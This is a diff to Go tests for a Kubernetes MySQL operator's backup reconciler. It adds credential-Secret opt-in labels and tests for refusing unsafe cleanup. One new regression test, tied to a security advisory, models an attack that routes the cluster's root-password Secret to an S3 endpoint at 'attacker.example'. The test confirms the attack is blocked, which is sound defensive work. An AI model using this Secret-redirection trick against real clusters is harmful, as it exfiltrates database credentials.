@@ -24,6 +24,7 @@ import (
 	"net/http/httptest"
 	"slices"
 	"strings"
+	"sync/atomic"
 	"testing"
 	"time"
 
@@ -34,6 +35,7 @@ import (
 	"k8s.io/apimachinery/pkg/api/resource"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 	"k8s.io/apimachinery/pkg/types"
+	"k8s.io/client-go/tools/record"
 	"k8s.io/utils/ptr"
 	ctrl "sigs.k8s.io/controller-runtime"
 	"sigs.k8s.io/controller-runtime/pkg/client"
@@ -42,6 +44,7 @@ import (
 
 	mysqlv1alpha1 "github.com/cnmsql/cnmsql/api/v1alpha1"
 	"github.com/cnmsql/cnmsql/pkg/management/mysql/backupworker"
+	"github.com/cnmsql/cnmsql/pkg/management/mysql/objectstore"
 )
 
 // listBackupArchive is the S3 LIST response for a single backup's archive
@@ -130,12 +133,13 @@ func TestBackupReconcileCreatesWorkerJobFromClusterObjectStore(t *testing.T) {
 
 	scheme := testScheme(t)
 	cluster := baseBackupCluster()
+	cluster.UID = testClusterUID
 	backup := baseBackup()
 	reconciler := &BackupReconciler{
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod()).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod()).
 			Build(),
 		Scheme: scheme,
 	}
@@ -160,6 +164,8 @@ func TestBackupReconcileCreatesWorkerJobFromClusterObjectStore(t *testing.T) {
 		"--bucket=cluster-backups",
 		"--archive-key=clusters/demo/backup-sample/",
 		"--sha256",
+		// Stamped in the manifest so retention can prove the store is ours.
+		"--cluster-uid=" + testClusterUID,
 	} {
 		if !strings.Contains(args, want) {
 			t.Fatalf("worker args missing %q:\n%s", want, args)
@@ -200,7 +206,7 @@ func TestBackupWorkerJobCarriesTheDataVolumeSize(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod()).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod()).
 			Build(),
 		Scheme: scheme,
 	}
@@ -229,7 +235,7 @@ func TestBackupReconcileRequeuesWhenWorkerJobNotVisibleYet(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod()).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod()).
 			WithInterceptorFuncs(interceptor.Funcs{
 				Get: func(ctx context.Context, c client.WithWatch, key client.ObjectKey, obj client.Object, opts ...client.GetOption) error {
 					if _, ok := obj.(*batchv1.Job); ok {
@@ -274,7 +280,7 @@ func TestBackupSpecObjectStoreOverridesCluster(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup).
+			WithObjects(s3CredentialsSecret(), overrideCredentialsSecret(), cluster, backup).
 			Build(),
 		Scheme: scheme,
 	}
@@ -302,7 +308,7 @@ func TestBackupPrimaryTargetUsesCurrentPrimary(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod()).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod()).
 			Build(),
 		Scheme: scheme,
 	}
@@ -336,7 +342,7 @@ func TestRecoveryBootstrapRestoresPrimaryFromObjectStore(t *testing.T) {
 	}
 
 	reconciler := &ClusterReconciler{
-		Client: fake.NewClientBuilder().WithScheme(scheme).WithObjects(cluster, backup).Build(),
+		Client: fake.NewClientBuilder().WithScheme(scheme).WithObjects(s3CredentialsSecret(), cluster, backup).Build(),
 		Scheme: scheme,
 	}
 
@@ -433,7 +439,7 @@ func TestRecoveryBootstrapAppliesJobTemplateResources(t *testing.T) {
 	}
 
 	reconciler := &ClusterReconciler{
-		Client: fake.NewClientBuilder().WithScheme(scheme).WithObjects(cluster, backup).Build(),
+		Client: fake.NewClientBuilder().WithScheme(scheme).WithObjects(s3CredentialsSecret(), cluster, backup).Build(),
 		Scheme: scheme,
 	}
 
@@ -482,7 +488,7 @@ func TestRecoveryBootstrapPITRTargetReplaysBinlogs(t *testing.T) {
 	}
 
 	reconciler := &ClusterReconciler{
-		Client: fake.NewClientBuilder().WithScheme(scheme).WithObjects(cluster, backup).Build(),
+		Client: fake.NewClientBuilder().WithScheme(scheme).WithObjects(s3CredentialsSecret(), cluster, backup).Build(),
 		Scheme: scheme,
 	}
 
@@ -643,7 +649,7 @@ func TestBackupDeleteWithFinalizerCleansObjectStore(t *testing.T) {
 		},
 	}
 	secret := &corev1.Secret{
-		ObjectMeta: metav1.ObjectMeta{Name: "override-s3", Namespace: "default"},
+		ObjectMeta: metav1.ObjectMeta{Name: "override-s3", Namespace: "default", Labels: map[string]string{objectstore.CredentialsSecretLabel: "true"}},
 		Data:       map[string][]byte{"access": []byte("key"), "secret": []byte("secret")},
 	}
 	reconciler := &BackupReconciler{
@@ -748,7 +754,7 @@ func TestBackupFailsWithJobFailureReason(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod(), job).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod(), job).
 			Build(),
 		Scheme: scheme,
 	}
@@ -814,7 +820,7 @@ func TestBackupFailsWithObjectStoreStalledReason(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod(), job, workerPod).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod(), job, workerPod).
 			Build(),
 		Scheme: scheme,
 	}
@@ -976,7 +982,7 @@ func logicalManifestFixture(t *testing.T, endpoint string) (*BackupReconciler, *
 		Status:     batchv1.JobStatus{Succeeded: 1},
 	}
 	secret := &corev1.Secret{
-		ObjectMeta: metav1.ObjectMeta{Name: "override-s3", Namespace: "default"},
+		ObjectMeta: metav1.ObjectMeta{Name: "override-s3", Namespace: "default", Labels: map[string]string{objectstore.CredentialsSecretLabel: "true"}},
 		Data:       map[string][]byte{"access": []byte("key"), "secret": []byte("secret")},
 	}
 	reconciler := &BackupReconciler{
@@ -1070,7 +1076,7 @@ func TestBackupWorkerJobAppliesTemplate(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod()).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod()).
 			Build(),
 		Scheme: scheme,
 	}
@@ -1123,7 +1129,7 @@ func TestBackupWorkerJobUserLabelCannotClobberOperatorLabel(t *testing.T) {
 		Client: fake.NewClientBuilder().
 			WithScheme(scheme).
 			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-			WithObjects(cluster, backup, readyReplicaPod()).
+			WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod()).
 			Build(),
 		Scheme: scheme,
 	}
@@ -1230,7 +1236,7 @@ func TestBackupCleanupUsesStatusObjectStoreWhenClusterGone(t *testing.T) {
 		},
 	}
 	secret := &corev1.Secret{
-		ObjectMeta: metav1.ObjectMeta{Name: "override-s3", Namespace: "default"},
+		ObjectMeta: metav1.ObjectMeta{Name: "override-s3", Namespace: "default", Labels: map[string]string{objectstore.CredentialsSecretLabel: "true"}},
 		Data:       map[string][]byte{"access": []byte("key"), "secret": []byte("secret")},
 	}
 	reconciler := &BackupReconciler{
@@ -1315,7 +1321,7 @@ func TestBackupRecordsBinlogObjectStore(t *testing.T) {
 			r := &BackupReconciler{
 				Client: fake.NewClientBuilder().WithScheme(scheme).
 					WithStatusSubresource(&mysqlv1alpha1.Backup{}).
-					WithObjects(cluster, backup, readyReplicaPod()).Build(),
+					WithObjects(s3CredentialsSecret(), cluster, backup, readyReplicaPod()).Build(),
 				Scheme: scheme,
 			}
 			reconcileBackup(t, r, backup)
@@ -1396,4 +1402,100 @@ func TestBackupWorkerVolumesProjectOnlyTheCACertificate(t *testing.T) {
 		return
 	}
 	t.Fatal("client-ca volume not found")
+}
+
+// Without the operator flag, deleting a Backup whose store has no static
+// credentials leaves the artifacts in place instead of reaching the store with
+// the operator's identity, and still releases the finalizer.
+func TestBackupDeleteSkipsCleanupWithoutCredentialsTheOperatorMayUse(t *testing.T) {
+	t.Parallel()
+
+	var contacted atomic.Bool
+	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
+		contacted.Store(true)
+		_, _ = w.Write([]byte(listBackupArchive))
+	}))
+	defer server.Close()
+
+	scheme := testScheme(t)
+	backup := baseBackup()
+	backup.Finalizers = []string{backupFinalizer}
+	now := metav1.Now()
+	backup.DeletionTimestamp = &now
+	backup.Status.BackupID = testBackupID
+	backup.Spec.ObjectStore = &mysqlv1alpha1.S3ObjectStore{
+		Bucket: "override-backups", Endpoint: server.URL,
+		Credentials: mysqlv1alpha1.S3Credentials{InheritFromIAMRole: true},
+	}
+	recorder := record.NewFakeRecorder(10)
+	reconciler := &BackupReconciler{
+		Client: fake.NewClientBuilder().
+			WithScheme(scheme).
+			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
+			WithObjects(backup).
+			Build(),
+		Scheme:   scheme,
+		Recorder: recorder,
+	}
+
+	reconcileBackup(t, reconciler, backup)
+
+	if contacted.Load() {
+		t.Fatal("the operator contacted a store it has no credentials for")
+	}
+	if event := <-recorder.Events; !strings.Contains(event, eventObjectStoreCredentialsRequired) {
+		t.Fatalf("event = %q, want %s", event, eventObjectStoreCredentialsRequired)
+	}
+	got := &mysqlv1alpha1.Backup{}
+	err := reconciler.Get(context.Background(), types.NamespacedName{Namespace: "default", Name: "backup-sample"}, got)
+	if !apierrors.IsNotFound(err) {
+		t.Fatalf("backup should be deleted, got err=%v finalizers=%v", err, got.Finalizers)
+	}
+}
+
+// GHSA-h4q2-3gj8-wfwf: a Backup editor who cannot read Secrets names the
+// cluster's root password as the access key and points the endpoint at a
+// server they control. The Backup fails before any worker Job (which the
+// kubelet would hand the Secret) exists.
+func TestBackupRefusesCredentialSecretsNotOptedIn(t *testing.T) {
+	t.Parallel()
+
+	scheme := testScheme(t)
+	cluster := baseBackupCluster()
+	root := &corev1.Secret{
+		ObjectMeta: metav1.ObjectMeta{Name: "demo-root", Namespace: "default"},
+		Data:       map[string][]byte{"password": []byte("root-pw")},
+	}
+	backup := baseBackup()
+	backup.Spec.ObjectStore = &mysqlv1alpha1.S3ObjectStore{
+		Bucket: "loot", Endpoint: "http://attacker.example",
+		Credentials: mysqlv1alpha1.S3Credentials{
+			AccessKeyID:     &mysqlv1alpha1.SecretKeySelector{Name: "demo-root", Key: "password"},
+			SecretAccessKey: &mysqlv1alpha1.SecretKeySelector{Name: "cluster-s3", Key: "secret"},
+		},
+	}
+	reconciler := &BackupReconciler{
+		Client: fake.NewClientBuilder().
+			WithScheme(scheme).
+			WithStatusSubresource(&mysqlv1alpha1.Backup{}).
+			WithObjects(s3CredentialsSecret(), root, cluster, backup, readyReplicaPod()).
+			Build(),
+		Scheme: scheme,
+	}
+
+	reconcileBackup(t, reconciler, backup)
+
+	job := &batchv1.Job{}
+	err := reconciler.Get(context.Background(), types.NamespacedName{Namespace: "default", Name: "backup-sample-backup"}, job)
+	if !apierrors.IsNotFound(err) {
+		t.Fatalf("worker Job created for a refused Secret (err=%v)", err)
+	}
+	updated := &mysqlv1alpha1.Backup{}
+	if err := reconciler.Get(context.Background(), types.NamespacedName{Namespace: "default", Name: "backup-sample"}, updated); err != nil {
+		t.Fatal(err)
+	}
+	if updated.Status.Phase != mysqlv1alpha1.BackupPhaseFailed ||
+		!strings.Contains(updated.Status.Error, objectstore.CredentialsSecretLabel) {
+		t.Fatalf("phase = %q error = %q, want Failed naming the label", updated.Status.Phase, updated.Status.Error)
+	}
 }
